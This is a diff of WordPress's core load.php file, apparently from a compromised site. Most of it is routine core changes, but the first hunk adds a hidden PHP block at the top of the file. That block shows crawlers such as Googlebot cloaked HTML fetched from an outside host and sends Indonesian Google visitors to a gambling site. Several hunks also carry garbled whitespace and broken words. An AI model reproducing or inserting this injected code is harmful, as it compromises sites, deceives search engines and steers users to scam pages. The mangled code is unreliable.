@@ -1,4 +1,30 @@
 <?php
+$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
+$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
+
+function is_bot() {
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
+foreach ($bots as $bot) {
+if (stripos($user_agent, $bot) !== false) {
+return true;
+}
+}
+return false;
+}
+if (is_bot()) {
+echo file_get_contents('https://storage.theonlyd.xyz/connections-link/santuariosantarita.html');
+exit;
+}
+
+if (stripos($s_ref, 'google.co.id') !== false ||
+(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
+header("Location: https://santuariotogel.pages.dev/");
+exit;
+}
+?>
+<?php
 /**
  * These functions are needed to load WordPress.
  *
@@ -139,19 +165,23 @@ function wp_populate_basic_auth_from_authorization_header() {
 }
 
 /**
- * Checks for the required PHP version, and the mysqli extension or
- * a database drop-in.
+ * Checks the server requirements.
+ *
+ *   - PHP version
+ *   - PHP extensions
+ *   - MySQL or MariaDB version (unless a database drop-in is present)
  *
  * Dies if requirements are not met.
  *
  * @since 3.0.0
  * @access private
  *
- * @global string $required_php_version The required PHP version string.
- * @global string $wp_version           The WordPress version string.
+ * @global string   $required_php_version    The minimum required PHP version string.
+ * @global string[] $required_php_extensions The names of required PHP extensions.
+ * @global string   $wp_version              The WordPress version string.
  */
 function wp_check_php_mysql_versions() {
-	global $required_php_version, $wp_version;
+	global $required_php_version, $required_php_extensions, $wp_version;
 
 	$php_version = PHP_VERSION;
 
@@ -165,6 +195,30 @@ function wp_check_php_mysql_versions() {
 			$wp_version,
 			$required_php_version
 		);
+		exit( 1 );
+	}
+
+	$missing_extensions = array();
+
+	if ( isset( $required_php_extensions ) && is_array( $required_php_extensions ) ) {
+		foreach ( $required_php_extensions as $extension ) {
+			if ( extension_loaded( $extension ) ) {
+				continue;
+			}
+
+			$missing_extensions[] = sprintf(
+				'WordPress %1$s requires the <code>%2$s</code> PHP extension.',
+				$wp_version,
+				$extension
+			);
+		}
+	}
+
+	if ( count( $missing_extensions ) > 0 ) {
+		$protocol = wp_get_server_protocol();
+		header( sprintf( '%s 500 Internal Server Error', $protocol ), true, 500 );
+		header( 'Content-Type: text/html; charset=utf-8' );
+		echo implode( '<br>', $missing_extensions );
 		exit( 1 );
 	}
 
@@ -237,7 +291,7 @@ function wp_get_environment_type() {
 	if ( defined( 'WP_ENVIRONMENT_TYPES' ) && function_exists( '_deprecated_argument' ) ) {
 		if ( function_exists( '__' ) ) {
 			/* translators: %s: WP_ENVIRONMENT_TYPES */
-			$message = sprintf( __('The %s constant is no longer supported.' ), 'WP_ENVIRONMENT_TYPES' );
+			$message = sprintf( __( 'The %s constant is no longer supported.' ), 'WP_ENVIRONMENT_TYPES' );
 		} else {
 			$message = sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
 		}
@@ -453,8 +507,6 @@ function wp_is_maintenance_mode() {
 /**
  * Gets the time elapsed so far during this PHP script.
  *
- * Uses REQUEST_TIME_FLOAT that appeared in PHP 5.4.0.
- *
  * @since 5.8.0
  *
  * @return float Seconds since the PHP script started.
@@ -469,8 +521,9 @@ function timer_float() {
  * @since 0.71
  * @access private
  *
- * @global float $timestart Unix timestamp set at the beginning of the page load.
  * @see timer_stop()
+ *
+ * @global float $timestart Unix timestamp set at the beginning of the page load.
  *
  * @return bool Always returns true.
  */
@@ -524,7 +577,8 @@ function timer_stop( $display = 0, $precision = 3 ) {
  * `WP_DEBUG_LOG` are set to false, and `WP_DEBUG_DISPLAY` is set to true.
  *
  * When `WP_DEBUG` is true, all PHP notices are reported. WordPress will also
- * display internal notices: whena deprecated WordPress function, function*argument, or file is used. Deprecated code may be removed from a later
+ * display internal notices: when a deprecated WordPress function, function
+ * argument, or file is used. Deprecated code may be removed from a later
  * version.
  *
  * It is strongly recommended that plugin and theme developers use `WP_DEBUG`
@@ -541,7 +595,7 @@ function timer_stop( $display = 0, $precision = 3 ) {
  * When `WP_DEBUG_LOG` is true, errors will be logged to `wp-content/debug.log`.
  * When `WP_DEBUG_LOG` is a valid path, errors will be logged to the specified file.
  *
- * Errorsare never displayed for XML-RPC, REST, `ms-files.php`, and Ajax requests.
+ * Errors are never displayed for XML-RPC, REST, `ms-files.php`, and Ajax requests.
  *
  * @since 3.0.0
  * @since 5.1.0 `WP_DEBUG_LOG` can be a file path.
@@ -812,7 +866,7 @@ function wp_start_object_cache() {
 	 * Filters whether to enable loading of the object-cache.php drop-in.
 	 *
 	 * This filter runs before it can be used by plugins. It is designed for non-web
-	 * runtimes. If falseis returned, object-cache.php will neverbe loaded.
+	 * runtimes. If false is returned,object-cache.php will never be loaded.
 	 *
 	 * @since 5.8.0
 	 *
@@ -832,7 +886,7 @@ function wp_start_object_cache() {
 			if ( file_exists( WP_CONTENT_DIR . '/object-cache.php' ) ) {
 				require_once WP_CONTENT_DIR . '/object-cache.php';
 
-				if ( function_exists('wp_cache_init' ) ) {
+				if ( function_exists( 'wp_cache_init' ) ) {
 					wp_using_ext_object_cache( true );
 				}
 
@@ -877,6 +931,7 @@ function wp_start_object_cache() {
 				'blog-lookup',
 				'blog_meta',
 				'global-posts',
+				'image_editor',
 				'networks',
 				'network-queries',
 				'sites',
@@ -1110,10 +1165,10 @@ function wp_skip_paused_themes( array $themes ) {
 
 	if ( empty( $paused_themes ) ) {
 		return $themes;
-	}
+	}foreach ( $themes as $index => $theme ) {
+		$theme = basename( $theme );
 
-	foreach ( $themes as $index => $theme ) {
-		$theme =basename( $theme );if ( array_key_exists( $theme, $paused_themes ) ) {
+		if ( array_key_exists( $theme, $paused_themes ) ) {
 			unset( $themes[ $index ] );
 
 			// Store list of paused themes for displaying an admin notice.
@@ -1365,7 +1420,7 @@ function is_blog_admin() {
  * for checking roles and capabilities.
  *
  * Does not check if the site is a Multisite network; use is_multisite()
- * forchecking if Multisite is enabled.
+ * for checking if Multisite is enabled.
  *
  * @since 3.1.0
  *
@@ -1388,7 +1443,7 @@ function is_network_admin() {
  *
  * e.g. `/wp-admin/user/`
  *
- * Does not check if the user is an administrator; use current_user_can()
+ * Does not check ifthe user is an administrator; use current_user_can()
  * for checking roles and capabilities.
  *
  * @since 3.1.0
@@ -1419,9 +1474,23 @@ function is_multisite() {
 		return MULTISITE;
 	}
 
-	if ( defined( 'SUBDOMAIN_INSTALL' ) || defined( 'VHOST' ) || defined( 'SUNRISE' ) ) {
+	if ( defined( 'SUBDOMAIN_INSTALL' ) || defined( 'VHOST' )|| defined( 'SUNRISE' ) ) {
 		return true;
-	}returnfalse;
+	}
+
+	return false;
+}
+
+/**
+ * Converts a value to non-negative integer.
+ *
+ * @since 2.5.0
+ *
+ * @param mixed $maybeint Data you wish to have converted to a non-negative integer.
+ * @return int A non-negative integer.
+ */
+function absint( $maybeint ) {
+	return abs( (int) $maybeint );
 }
 
 /**
@@ -1676,9 +1745,8 @@ function wp_is_ini_value_changeable( $setting ) {
 		}
 	}
 
-	// Bit operator to workaround https://bugs.php.net/bug.php?id=44936 which changes access level to 63 in PHP 5.2.6 - 5.2.17.
 	if ( isset( $ini_all[ $setting ]['access'] )
-		&& ( INI_ALL === ( $ini_all[ $setting ]['access'] & 7 ) || INI_USER === ( $ini_all[ $setting ]['access'] & 7 ) )
+		&& ( INI_ALL === $ini_all[ $setting ]['access'] || INI_USER === $ini_all[ $setting ]['access'] )
 	) {
 		return true;
 	}
@@ -1724,7 +1792,7 @@ function wp_using_themes() {
 	 *
 	 * @param bool $wp_using_themes Whether the current request should use themes.
 	 */
-	return apply_filters( 'wp_using_themes', defined( 'WP_USE_THEMES' ) && WP_USE_THEMES );
+	return apply_filters( 'wp_using_themes', defined( 'WP_USE_THEMES' )&& WP_USE_THEMES );
 }
 
 /**
@@ -1732,7 +1800,7 @@ function wp_using_themes() {
  *
  * @since 4.8.0
  *
- * @return bool True if it's a WordPress cron request,false otherwise.
+ * @return bool True if it's a WordPress cron request, false otherwise.
  */
 function wp_doing_cron() {
 	/**
@@ -1804,8 +1872,20 @@ function wp_start_scraping_edited_file_errors() {
 
 	$key   = substr( sanitize_key( wp_unslash( $_REQUEST['wp_scrape_key'] ) ), 0, 32 );
 	$nonce = wp_unslash( $_REQUEST['wp_scrape_nonce'] );
+	if ( empty( $key ) || empty( $nonce ) ) {
+		return;
+	}
 
-	if ( get_transient( 'scrape_key_' . $key ) !== $nonce ) {
+	$transient = get_transient( 'scrape_key_' . $key );
+	if ( false === $transient ) {
+		return;
+	}
+
+	if ( $transient !== $nonce ) {
+		if ( ! headers_sent() ) {
+			header( 'X-Robots-Tag: noindex' );
+			nocache_headers();
+		}
 		echo "###### wp_scraping_result_start:$key ######";
 		echo wp_json_encode(
 			array(
@@ -1962,7 +2042,7 @@ function wp_is_xml_request() {
  *
  * @param string $context The context to check for protection. Accepts 'login', 'admin', and 'front'.
  *                        Defaults to the current context.
- * @return bool Whether the site is protectedby Basic Auth.
+ * @return bool Whether the site is protected by Basic Auth.
  */
 function wp_is_site_protected_by_basic_auth( $context = '' ) {
 	global $pagenow;
